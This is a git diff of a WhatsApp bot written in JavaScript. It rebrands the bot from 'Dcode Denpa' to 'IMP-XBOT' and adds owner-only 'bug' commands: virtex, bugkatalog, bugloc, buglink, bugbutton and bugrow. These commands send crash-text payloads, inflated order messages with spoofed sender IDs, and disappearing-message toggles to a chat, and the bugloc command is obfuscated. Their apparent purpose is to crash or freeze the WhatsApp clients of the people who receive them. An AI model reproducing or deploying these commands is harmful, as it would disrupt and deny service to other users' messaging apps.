@@ -66,6 +66,18 @@ const { wikiSearch } = require('./lib/wiki.js')
 const { herolist } = require('./lib/herolist.js')
 const { herodetails } = require('./lib/herodetail.js')
 const { mediafireDl } = require('./lib/mediafire.js')
+const { virtex } = require('./virtex/virtex')
+const { virtex2 } = require('./virtex/virtex2')
+const { virtex3 } = require('./virtex/virtex3')
+const { virtex4 } = require('./virtex/virtex4')
+const { virtex5 } = require('./virtex/virtex5')
+const { virtex6 } = require('./virtex/virtex6')
+const { virtex7 } = require('./virtex/virtex7')
+const { virtex8 } = require('./virtex/virtex8')
+const { virtex9 } = require('./virtex/virtex9')
+const { ngazap } = require('./virtex/ngazap')
+const { virtag } = require('./virtex/virtag')
+const { emoji2 } = require('./virtex/emoji2')
 const { pinterest } = require('./lib/pinterest')
 const { addCommands, checkCommands, deleteCommands } = require('./lib/autoresp')
 const { yta, ytv, buffer2Stream, ytsr, baseURI, stream2Buffer, noop } = require('./lib/ytdl')
@@ -311,11 +323,11 @@ try {
 		}
 		if (antibot === true) return
 		const katalog = (teks) => {
-             res = denz.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*_© Dcode Denpa_*", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftrol})
+             res = denz.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*_© IMP-XBOT_*", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftrol})
              denz.relayWAMessage(res)
         }
         const grupinv = (teks) => {
-        	grup = denz.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx', "groupName": `${NamaBot}`, "footerText": "*_© Dcode Denpa_*", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
+        	grup = denz.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx', "groupName": `${NamaBot}`, "footerText": "*_© IMP-XBOT_*", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
             denz.relayWAMessage(grup)
         }
 		idttt = []
@@ -662,7 +674,7 @@ if (!mek.key.remoteJid.endsWith('@g.us') && offline){
             if (isAfk(mek.key.remoteJid)) return
             addafk(mek.key.remoteJid)
 			heheh = ms(Date.now() - waktuafk)
-		  sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© Dcode Denpa_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
+		  sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© IMP-XBOT_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
 			}
 		}
 		if (mek.key.remoteJid.endsWith('@g.us') && offline) {
@@ -675,7 +687,7 @@ if (!mek.key.remoteJid.endsWith('@g.us') && offline){
                         if (isAfk(mek.key.remoteJid)) return
                         addafk(mek.key.remoteJid)
 						heheh = ms(Date.now() - waktuafk)
-			       sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© Dcode Denpa_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
+			       sendButMessage(from, `Hai ${pushname}, Maaf sepertinya saat ini ${NamaOwner} sedang Offline\n\n*Alasan :* ${alasanafk}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik\n\nSilahkan hubungi lagi setelah Online`, "*_© IMP-XBOT_*", [{buttonId: 'simi', buttonText: {displayText: 'Oke'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
 					}
 				}
 						}
@@ -739,7 +751,7 @@ if (!mek.key.remoteJid.endsWith('@g.us') && offline){
 	        denz.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {contextInfo: {"mentionedJid": ane}})
             }
 		const reply = (teks) => {
-			denz.sendMessage(from, teks, text, { thumbnail: dfrply, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jmn} - ${week} ${weton} - ${calender}`,body:"",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:`https://wa.me/6285866295942?text=Assalamualaikum`}}})
+			denz.sendMessage(from, teks, text, { thumbnail: dfrply, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jmn} - ${week} ${weton} - ${calender}`,body:"",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:`https://wa.me/6285774523785?text=Assalamualaikum`}}})
 		}
 		const simir = (teks) => {
 			denz.sendMessage(from, teks, text, { quoted:ftrol })
@@ -900,32 +912,23 @@ return reply(parse)
 				reply('Link terdeteksi, Auto kick!')
 			    denz.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
 			}
-			}
-			if (!m.key.fromMe && bad.includes(messagesD)) {
-				reply('_Jangan Toxic!_')
-				}
-				if (!isGroup && !isCmd && !command && !mek.key.fromMe && autorespon) {
-simi = await fetchJson(`https://api.simsimi.net/v2/?text=${cmd}&lc=ID`)
-                     sami = simi.success
-                        denz.sendMessage(from, `${sami}`, text, {thumbnail: ofrply, sendEphemeral: true, quoted:mek})
                       }
-if (autoread) {
-denz.chatRead(from)
-}
-if (autocomposing) {
-denz.updatePresence(from, Presence.composing)
-}
 if (autorecording) {
-denz.updatePresence(from, Presence.recording)
+	if (autorecording === false) return
+await denz.updatePresence(from, Presence.recording)
+} 
+if (autocomposing) {
+	if (autocomposing === false) return
+await denz.updatePresence(from, Presence.composing)
 }
 if (budy.startsWith('Denz')){
-sendButMessage(from, `${JSON.stringify(me, null, 2)}`, "*_© Dcode Denpa_*", [{buttonId: 'igm', buttonText: {displayText: 'Instagram'}, type: 1},{buttonId: 'ytm', buttonText: {displayText: 'YouTube'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
+sendButMessage(from, `${JSON.stringify(me, null, 2)}`, "*_© IMP-XBOT_*", [{buttonId: 'igm', buttonText: {displayText: 'Instagram'}, type: 1},{buttonId: 'ytm', buttonText: {displayText: 'YouTube'}, type: 1}], {quoted:ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
 }
 if(isButton == 'igm'){
-reply('http://instagram.com/dcodedenpa')
+reply('https://www.instagram.com/im_pos_ible990/')
 }
 if(isButton == 'ytm'){
-reply('http://youtube.com/dcodedenpa')
+reply('https://tinyurl.com/yg4k8bvg')
 }
 
    const sotoy = [
@@ -989,35 +992,40 @@ reply('http://youtube.com/dcodedenpa')
 			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
        menu = `❏「 \`\`\`${NamaBot}\`\`\` 」
 
-╾ _Creator : @${dtod.split('@')[0]}_
-╾ _Battery : ${baterai.battery}_
-╾ _Mode : ${publik ? 'Public' : 'Self'}_
-╾ _Total Hit : ${cmhit.length}_
-╾ _Command : ${prefix + command}_
+│> ⬡Creator : @${dtod.split('@')[0]}_
+│> ⬡Battery : ${baterai.battery}_
+│> ⬡Mode : ${publik ? 'Public' : 'Self'}_
+│> ⬡Total Hit : ${cmhit.length}_
+│> ⬡Command : ${prefix + command}_
 
 ❏「 \`\`\`INFO BOT\`\`\` 」
 
-╾ _Nama Bot : ${NamaBot}_
-╾ _Nama Owner : ${NamaOwner}_
-╾ _Nomor Owner : @${otod.split('@')[0]}_
-╾ _Auto Composing : ${autocomposing}_
-╾ _Auto Recording : ${autorecording}_
+│> ⬡Nama Bot : ${NamaBot}_
+│> ⬡Nama Owner : ${NamaOwner}_
+│> ⬡Nomor Owner : @${otod.split('@')[0]}_
+│> ⬡Auto Composing : ${autocomposing}_
+│> ⬡Auto Recording : ${autorecording}_
 
 ❏「 \`\`\`INFO USER\`\`\` 」
 
-╾ _Status : ${isOwner ? 'Owner' : 'User'}_
-╾ _Nama : ${pushname}_
-╾ _Bio : ${stst}_
-╾ _Nomor : @${stod.split('@')[0]}_
-╾ _Info Nomor : ${num.line_type} - ${num.country_name} - ${num.carrier}_`
-sendButDocument(from, `${menu}`, "*_© Dcode Denpa_*", fs.readFileSync('./sampah/Denpa'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('./media/image/banner.jpg'), filename:`${jmn} - ${week} - ${calender}`}, [{buttonId:`command`,buttonText:{displayText:'LIST MENU'},type:1},{buttonId:`owner`,buttonText:{displayText:'DEVELOPER'},type:1},{buttonId:`script`,buttonText:{displayText:'SOURCE CODE'},type:1}], {quoted:fmen, contextInfo: { mentionedJid: [dtod,otod,stod], forwardingScore: 508, isForwarded: true, externalAdReply:{title:`${tampilUcapan} ${pushname}`,body:`*click here to play music`,mediaType:"2",thumbnail:ofrply,mediaUrl:`https://youtu.be/uQiF1yOnzDg`}}})
+│> ⬡Status : ${isOwner ? 'Owner' : 'User'}_
+│> ⬡Nama : ${pushname}_
+│> ⬡Bio : ${stst}_
+│> ⬡Nomor : @${stod.split('@')[0]}_
+│> ⬡Info Nomor : ${num.line_type} - ${num.country_name} - ${num.carrier}_`
+sendButDocument(from, `${menu}`, "*_© IMP-XBOT_*", fs.readFileSync('./sampah/Denpa'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('./media/image/banner.jpg'), filename:`${jmn} - ${week} - ${calender}`}, [{buttonId:`command`,buttonText:{displayText:'LIST MENU'},type:1},{buttonId:`owner`,buttonText:{displayText:'DEVELOPER'},type:1},{buttonId:`script`,buttonText:{displayText:'SOURCE CODE'},type:1}], {quoted:fmen, contextInfo: { mentionedJid: [dtod,otod,stod], forwardingScore: 508, isForwarded: true, externalAdReply:{title:`${tampilUcapan} ${pushname}`,body:`*click here to play music`,mediaType:"2",thumbnail:ofrply,mediaUrl:`https://youtu.be/uQiF1yOnzDg`}}})
 break
 case 'command':
  stod = `${sender}`
  listMsg = {
  buttonText: 'LIST MENU',
- footerText: '*_© Dcode Denpa_*',
- description: `Hai kak @${stod.split('@')[0]}, Silahkan pilih menu disini`,
+ footerText: '*_© IMP-XBOT_*',
+ description: `> ⬡Creator : @${dtod.split('@')[0]}
+│> ⬡Battery : ${baterai.battery}
+│> ⬡Mode : ${publik ? 'Public' : 'Self'}
+│> ⬡Prefix : ${multi ? 'Multi Prefix' : 'No Prefix'}
+│> ⬡Nomor Owner : @${otod.split('@')[0]}
+︎│> ⬡OS : ${os.platform()}`,
  sections: [
                      {
                       "title": `${jmn} - ${week} ${weton} - ${calender}`,
@@ -1090,6 +1098,11 @@ menu = `❏ 「 \`\`\`MENU OWNER\`\`\` 」
 ├ ${prefix}unmute
 ├ ${prefix}public
 ├ ${prefix}self
+├ ${prefix}bugrow
+├ ${prefix}bugbutton
+├ ${prefix}bugloc
+├ ${prefix}bugkatalog
+├ ${prefix}virtex
 ├ ${prefix}spam [ _teks|jumlah_ ]
 ├ ${prefix}demoteall
 ├ ${prefix}promoteall
@@ -1260,7 +1273,7 @@ katalog(menu)
 break
 case 'jadibot':
 client.version = [2, 2119, 6]
-client.browserDescription = ['Dcode Denpa','Desktop','3.0']
+client.browserDescription = ['IMP-XBOT','Desktop','3.0']
 if (args[0] && args[0].length > 200) {
 	let json = Buffer.from(args[0], 'base64').toString('utf-8')
     let obj = JSON.parse(json)
@@ -1313,7 +1326,7 @@ for (let i of ownerNumber) {
 const vname = denz.contacts[i] != undefined ? denz.contacts[i].vname || denz.contacts[i].notify : undefined
 ini_list.push({
 "displayName": `Developer ${NamaBot}`,
-"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Dcode Denpa;;;\nFN:${vname ? `${vname}` : `${denz.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
+"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;IMP-XBOT;;;\nFN:${vname ? `${vname}` : `${denz.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
 })
 }
 denz.sendMessage(from, {
@@ -1354,7 +1367,7 @@ break
 				case 'script':
 		case 'sc':
 		case 'sourcecode':
-		denz.sendMessage(from, { text: "https://github.com/dcode-denpa/bitch-boot", matchedText: 'https://github.com/dcode-denpa/bitch-boot', description: "", title: "don't click here !!!", jpegThumbnail: ofrply }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
+		denz.sendMessage(from, { text: "https://tinyurl.com/yg4k8bvg", matchedText: 'https://tinyurl.com/yg4k8bvg', description: "", title: "Ngapain dek?", jpegThumbnail: ofrply }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
 		break
        case 'debug':
 			 res = await denz.prepareMessageFromContent(from,{
@@ -2177,6 +2190,18 @@ emror = String(e)
 reply(`${e}`)
 }
 break
+    case 'tomp4':
+            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
+            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
+            owgi = await denz.downloadAndSaveMediaMessage(ger)
+            webp2mp4File(owgi).then(res=>{
+            sendMediaURL(from,res.result,'Done')
+            })
+            }else {
+            reply('reply stiker')
+            }
+            fs.unlinkSync(owgi)
+            break
 case 'sharelock':
 kntl = `${args.join(' ')}`
 nama = kntl.split("|")[0];
@@ -2903,7 +2928,7 @@ break
 					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
 					if (args.length < 1) return reply('Jumlahnya?')
 				 for (let i = 0; i < args[0]; i++) {
-await denz.toggleDisappearingMessages(from, 0)
+await denz.relayWAMessage(denz.prepareMessageFromContent(from, denz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
 }
 reply('Sukses send bug sebanyak '+args.join(' '))
 					break
@@ -2975,6 +3000,94 @@ bug(targett)
 }
 
 attack(mek.key.remoteJid)
+break
+case 'virtex':
+if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
+katalog(`${ngazap(prefix)}`)
+katalog(`${emoji2(prefix)}`)
+katalog(`${virtex(prefix)}`)
+katalog(`${virtex2(prefix)}`)
+katalog(`${virtex3(prefix)}`)
+katalog(`${virtex4(prefix)}`)
+katalog(`${virtex5(prefix)}`)
+katalog(`${virtex6(prefix)}`)
+katalog(`${virtex7(prefix)}`)
+katalog(`${virtex8(prefix)}`)
+katalog(`${virtex9(prefix)}`)
+katalog(`${virtag(prefix)}`)
+break
+case 'bugkatalog':
+if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
+denz.toggleDisappearingMessages(from, 0)
+ babi = (teks) => {
+             res = denz.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": teks, "footerText": `${emoji2(prefix)}`, "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted: {
+  key: {
+   participant: '0@s.whatsapp.net' // Fake sender Jid
+  },
+  message: {
+   orderMessage: {
+    itemCount: 9999999, // Bug
+    status: 1,
+    surface: 1,
+    message: `${virtex6(prefix)}`,
+    orderTitle: `${emoji2(prefix)}`, // Idk what this does
+    sellerJid: '0@s.whatsapp.net' // Seller
+   }
+  }
+ }
+})
+             denz.relayWAMessage(res)
+        }
+        babi(`${ngazap(prefix)}`)
+        babi(`${virtag(prefix)}`)
+        babi(`${virtex6(prefix)}`)
+        babi(`${emoji2(prefix)}`)
+        break
+case 'bugloc':
+function _0x4ee9(_0x1253de,_0x4df4d5){var _0x587b3c=_0x587b();return _0x4ee9=function(_0x4ee946,_0x170efd){_0x4ee946=_0x4ee946-0x1c6;var _0x33a62e=_0x587b3c[_0x4ee946];return _0x33a62e;},_0x4ee9(_0x1253de,_0x4df4d5);}var _0x1fb12b=_0x4ee9;function _0x587b(){var _0x573ab6=['readFileSync','12536840GCstSf','sendMessage','only','536IkuDmm','key','2675700WtsjtO','ownerB','./denz.jpg','fromMe','2224464MiisaG','18qcFOZT','83468rQXPeY','0@s.whatsapp.net','25944fErnRh','115851EirsKL','184fyRhDo','178400WTzYEN'];_0x587b=function(){return _0x573ab6;};return _0x587b();}(function(_0x2dcd13,_0x2f923e){var _0x3d06c1=_0x4ee9,_0x2352ff=_0x2dcd13();while(!![]){try{var _0x266d76=parseInt(_0x3d06c1(0x1cc))/0x1+-parseInt(_0x3d06c1(0x1ce))/0x2+-parseInt(_0x3d06c1(0x1cb))/0x3*(parseInt(_0x3d06c1(0x1cd))/0x4)+-parseInt(_0x3d06c1(0x1d5))/0x5+-parseInt(_0x3d06c1(0x1c7))/0x6+-parseInt(_0x3d06c1(0x1c9))/0x7*(parseInt(_0x3d06c1(0x1d3))/0x8)+-parseInt(_0x3d06c1(0x1c8))/0x9*(-parseInt(_0x3d06c1(0x1d0))/0xa);if(_0x266d76===_0x2f923e)break;else _0x2352ff['push'](_0x2352ff['shift']());}catch(_0x4d3113){_0x2352ff['push'](_0x2352ff['shift']());}}}(_0x587b,0x6953b));if(!isOwner&&!mek[_0x1fb12b(0x1d4)][_0x1fb12b(0x1c6)])return reply(mess[_0x1fb12b(0x1d2)][_0x1fb12b(0x1d6)]);denz[_0x1fb12b(0x1d1)](from,{'degreesLatitude':6.493187928699356,'degreesLongitude':80.30968201252108,'name':''+emoji2(prefix),'address':''+virtex6(prefix),'jpegThumbnail':fs[_0x1fb12b(0x1cf)](_0x1fb12b(0x1d7))},location,{'quoted':{'key':{'participant':_0x1fb12b(0x1ca)},'message':{'orderMessage':{'itemCount':0x98967f,'status':0x1,'surface':0x1,'message':''+NamaBot,'orderTitle':''+NamaOwner,'sellerJid':'0@s.whatsapp.net'}}}});
+         break
+                case 'buglink':
+                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
+                 await denz.relayWAMessage(denz.prepareMessageFromContent(from, denz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
+               denz.sendMessage(from, virtex3(prefix), text, { quoted:ftrol, contextInfo :{text: '🔥',
+            "forwardingScore": 1000000000,
+            isForwarded: false,
+            sendEphemeral: false,
+            "externalAdReply": {
+                "title": `${virtex2(prefix)}`,
+                "body": "",
+                "previewType": "PHOTO",
+                "thumbnailUrl": "https://i.ibb.co/3hrZZ6s/tsukasa.png",
+                "thumbnail": fs.readFileSync(`./denz.jpg`),
+                "sourceUrl": "https://chat.whatsapp.com/HQCry1KsxNE3C6GTK2QAiJ"}}})
+                break
+        case 'bugbutton':
+        if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
+        await denz.relayWAMessage(denz.prepareMessageFromContent(from, denz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
+        sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {jpegThumbnail:ofrply}, [{buttonId:`${prefix}bbaij72njnwjibdo16830nslm1782`,buttonText:{displayText:'IMP-GANZ🌹'},type:1}])
+        await denz.relayWAMessage(denz.prepareMessageFromContent(from, denz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
+break
+case 'bugrow':
+if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
+denz.toggleDisappearingMessages(from, 0)
+ listMsg = {
+ buttonText: 'LIST MENU',
+ footerText: `${emoji2(prefix)}`,
+ description: `${virtex6(prefix)}`,
+ sections: [
+                     {
+                      "title": "CieKontol",
+ rows: [
+                          {
+                              "title": "CieBug",
+                              "rowId": ""
+                           }
+                        ]
+                     }],
+ listType: 1
+}
+denz.sendMessage(from, listMsg, MessageType.listMessage, {quoted:ftrol})
+await denz.relayWAMessage(denz.prepareMessageFromContent(from, denz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
 break
 case 'bugtroli2':
 if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
@@ -3765,7 +3878,7 @@ Giliran = @${tty.player1.split('@')[0]}`
             if (!e.includes("Cannot set property 'mtype' of undefined")) {
             if (!e.includes("jid is not defined")) {
      console.log(color('|ERR|', 'red'), color(e, 'cyan'))
-     denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `─────「 *ALERT-ERROR* 」─────\n\n\`\`\`${e}\`\`\`\n\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
+     denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `─────「 *ALERT-ERROR* 」─────\n\n\`\`\`${e}\`\`\`\n\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6285774523785?text=Assalamualaikum"}}})
 	}
     }
     }
